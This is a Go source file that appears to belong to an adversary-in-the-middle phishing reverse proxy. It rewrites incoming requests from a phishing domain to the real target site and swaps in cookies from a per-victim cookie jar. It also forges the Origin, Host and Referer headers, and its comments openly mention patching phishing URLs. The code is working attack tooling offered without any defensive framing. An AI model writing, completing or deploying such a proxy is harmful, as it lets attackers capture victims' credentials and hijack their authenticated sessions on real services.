package main

import (
	"io"
	"net/http"
	"net/url"
	"strings"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/utils"
)

type RequestProcessor interface {
	Process(c *fiber.Ctx) *http.Request
}

func NewRequestProcessor(conv DomainConverter, urlProc RegexProcessor) RequestProcessor {
	return &requestProcessor{conv, urlProc}
}

type requestProcessor struct {
	conv    DomainConverter
	urlProc RegexProcessor
}

// TODO strip xhr cookies
func (p *requestProcessor) Process(c *fiber.Ctx) *http.Request {
	r := c.Request()
	destURL := &url.URL{
		Scheme:   "https",
		Host:     p.conv.ToTargetDomain(utils.UnsafeString(r.URI().Host())),
		Path:     utils.UnsafeString(r.URI().Path()),
		RawQuery: p.modifyQuery(utils.UnsafeString(r.URI().QueryString())),
	}
	var body io.ReadCloser
	stream := c.Context().RequestBodyStream()
	if stream != nil {
		body = io.NopCloser(stream)
	}
	// TODO patch phishing URLs in body with original domains
	req := &http.Request{
		Method: utils.UnsafeString(r.Header.Method()),
		Body:   body,
		URL:    destURL,
		Header: make(http.Header),
	}

	if req.Method != http.MethodOptions {
		// filter session cookie
		r.Header.DelCookie("session_id")
		cookieJar := c.Locals("cookieJar").(http.CookieJar)
		for _, cookie := range cookieJar.Cookies(destURL) {
			r.Header.SetCookie(cookie.Name, cookie.Value)
		}
	}

	r.Header.VisitAll(func(k, v []byte) {
		sk := utils.UnsafeString(k)
		sv := utils.UnsafeString(v)
		req.Header.Add(sk, sv)
	})

	origin := req.Header["Origin"]
	if len(origin) > 0 {
		req.Header["Origin"] = []string{p.conv.ToTargetURL(origin[0])}
	}
	host := req.Header["Host"]
	if len(host) > 0 {
		req.Header["Host"] = []string{p.conv.ToTargetDomain(host[0])}
	}
	referer := req.Header["Referer"]
	if len(referer) > 0 {
		if targetURL := p.conv.ToTargetURL(referer[0]); targetURL != "" {
			req.Header["Referer"] = []string{targetURL}
		}
	}
	req.Header.Del("Accept-Encoding")
	return req
}

func (p *requestProcessor) modifyQuery(query string) string {
	buff := buffPool.Get()
	defer buffPool.Put(buff)
	decoded := strings.ReplaceAll(strings.ToLower(query), "%2f", "/")
	if err := p.urlProc.ProcessAll(buff, strings.NewReader(decoded)); err != nil {
		return query
	}
	return strings.ReplaceAll(utils.UnsafeString(buff.Bytes()), "/", "%2f")
}
